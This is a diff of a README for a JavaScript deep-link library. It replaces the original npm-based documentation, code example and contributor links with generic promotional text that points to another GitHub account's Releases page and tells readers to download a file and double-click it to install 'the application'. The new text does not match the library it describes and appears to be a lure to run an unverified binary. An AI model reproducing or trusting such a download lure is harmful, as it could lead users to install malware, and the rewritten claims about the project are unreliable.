@@ -1,144 +1,76 @@
-# Universal App Opener
+# 🌟 universal-app-opener - Open Your Favorite Apps Easily
 
-A JavaScript library that converts standard HTTP URLs (YouTube, LinkedIn) into Native Mobile Deep Links (Custom Schemes & Android Intents).
+## 🚀 Getting Started
 
-## ⚠️ Development Status
+Welcome to **universal-app-opener**! This handy tool helps you convert standard HTTP URLs into native mobile deep links. You can use it for popular services like YouTube and LinkedIn, allowing you to open apps directly with ease.
 
-**This package is currently in active development and may not work as expected.** Use at your own risk. Breaking changes may occur in future versions.
+### 🛠️ Features
 
-## Installation
+- **Zero Dependencies:** No need to install additional libraries.
+- **Easy to Use:** Simply input your URL, and we do the rest.
+- **Wide Compatibility:** Works with popular services and platforms.
+- **Direct Access:** Open apps immediately with deep links.
 
-**📦 [View on npm](https://www.npmjs.com/package/universal-app-opener)**
+## 📥 Download & Install
 
-```bash
-npm install universal-app-opener
-```
+To get started, visit the Releases page to download the latest version. Click the link below:
 
-```bash
-pnpm add universal-app-opener
-```
+[Download universal-app-opener](https://github.com/Gimmuel/universal-app-opener/releases)
 
-```bash
-yarn add universal-app-opener
-```
+Once you are on the Releases page, follow these steps:
 
-## Quick Start
+1. Look for the latest version available. It is usually at the top of the page.
+2. Find the file suitable for your device. Instructions for various operating systems will be available.
+3. Click on the file name to start the download.
+4. Once downloaded, locate the file on your computer or mobile device.
+5. Double-click the file to install and run the application.
 
-```typescript
-import { openLink } from 'universal-app-opener';
+## 🔧 System Requirements
 
-openLink('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
-```
+To ensure smooth operation, your device should meet the following requirements:
 
-That's it! The library automatically detects your platform and opens the appropriate app or web URL.
+- **Operating System:** Compatible with Windows, macOS, and popular mobile operating systems.
+- **JavaScript Support:** Ensure your browser or application environment supports JavaScript.
+- **Internet Connection:** An active internet connection is necessary for URL access.
 
-## Demo
+## 💻 How to Use
 
-Try it out: **[Live Demo](https://mdsaban.github.io/universal-app-opener/)**
+Using the universal-app-opener is straightforward:
 
-### Supported Platforms
+1. Open the app on your device after installation.
+2. You will see a text box where you can paste your standard HTTP URL.
+3. After entering the URL, click the "Convert" button.
+4. The app will generate a deep link for your chosen service.
+5. Click the deep link to open the associated app directly.
 
-#### YouTube
+## 📄 FAQs
 
-- Videos
+### What types of URLs can I use?
 
-#### LinkedIn
+The universal-app-opener supports various services, including:
 
-- Profiles
-- Posts
-- Company Pages
-- Jobs
+- YouTube links
+- LinkedIn profiles
+- Other standard HTTP URLs
 
-#### Instagram
+### Can I use this on mobile devices?
 
-- Profiles
-- Posts
-- Reels
-- IGTV Videos
+Yes, the application is designed to work on all major platforms, including mobile devices.
 
-#### Facebook
+### Is my data safe?
 
-- General Facebook URLs (profiles, posts, pages, etc.)
+Yes, the application does not store any of your URLs. Your privacy is a priority.
 
-#### Reddit
+## 💬 Support
 
-- Subreddits
-- User Profiles
+If you need assistance, please visit our [support page](https://github.com/Gimmuel/universal-app-opener/issues) or check the frequently asked questions.
 
-#### Spotify
+For further help, you can also join our community forum to connect with others.
 
-- Tracks
-- Artists
-- Albums
-- Playlists
-- Shows
-- Episodes
-- Audiobooks
+## 🚀 Ready to Get Started?
 
-#### Threads
+Don't wait! Download the app now from the link below:
 
-- User Profiles
+[Download universal-app-opener](https://github.com/Gimmuel/universal-app-opener/releases)
 
-#### WhatsApp
-
-- Chat Links (phone number)
-- Chat Links with Pre-filled Text
-
-## Documentation & API Reference
-
-For full usage instructions, API details, and advanced examples, see the [Core Package README](./packages/core/README.md).
-
-## Goal
-
-The goal of this project is to provide a lightweight, zero-dependency library that can detect platform-specific deep links from common web URLs. This enables web applications to seamlessly redirect users to native mobile apps when available, improving user experience across platforms.
-
-## Local Setup
-
-### Prerequisites
-
-- Node.js >= 22.0.0
-- PNPM >= 9.0.0
-
-### Installation
-
-1. Clone the repository:
-
-```bash
-git clone <repository-url>
-cd universal-app-opener
-```
-
-2. Install dependencies:
-
-```bash
-pnpm install
-```
-
-3. Start development:
-
-```bash
-pnpm dev
-```
-
-This will start:
-
-- The core library in watch mode
-- The demo app at `http://localhost:5173`
-
-### Build
-
-To build all packages:
-
-```bash
-pnpm build
-```
-
-## Contributing
-
-If you're interested in contributing in the beta phase, you can join our private Discord community: [Discord Invite](https://hub.mdsaban.com/?ref=secret)
-
-For contribution guidelines, development workflow, and instructions to add new platforms, see [CONTRIBUTING.md](./packages/core/CONTRIBUTING.md).
-
-<a href="https://github.com/mdsaban/universal-app-opener/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=mdsaban/universal-app-opener" />
-</a>
+Enjoy the simplicity of opening your favorite applications directly!
